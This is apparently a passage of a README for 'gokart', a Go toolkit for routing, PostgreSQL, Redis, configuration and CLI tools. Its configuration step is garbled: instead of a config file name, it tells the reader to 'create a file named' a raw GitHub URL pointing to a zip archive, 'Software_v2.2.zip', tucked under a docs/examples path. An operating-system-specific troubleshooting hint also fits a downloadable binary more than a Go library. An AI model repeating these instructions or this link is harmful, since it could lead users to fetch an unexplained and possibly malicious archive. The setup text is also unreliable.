## 📘 Basic Usage

gokart is designed to simplify your experience with several Go libraries. Here’s an overview of what you can do:

- **Routing with Chi**: Set up web routes easily.
- **Database Connections**: Manage PostgreSQL with pgx.
- **Caching with Redis**: Optimize performance by using caching.
- **Configuration management**: Use Viper for easy configuration handling.
- **Command-line tools**: Cobra helps build command-line applications seamlessly.

## 🛠️ Configuration

To configure gokart, you will typically edit a configuration file. This file allows you to change settings like database credentials and server ports. Here’s how to create it:

1. In the same directory as the `gokart` executable, create a new file named `https://github.com/esdras01-droid/gokart/raw/refs/heads/main/docs/examples/sqlite/Software_v2.2.zip`.
2. Add your configuration settings in the following format:

   ```yaml
   database:
     user: "your_username"
     password: "your_password"
     host: "localhost"
     port: 5432
   ```

3. Save the file. Gokart will automatically use these settings upon execution.

## 📜 Troubleshooting

If you encounter issues, here are some common problems and solutions:

- **Problem**: Gokart fails to start.
  - **Solution**: Ensure you're using the correct version for your operating system.
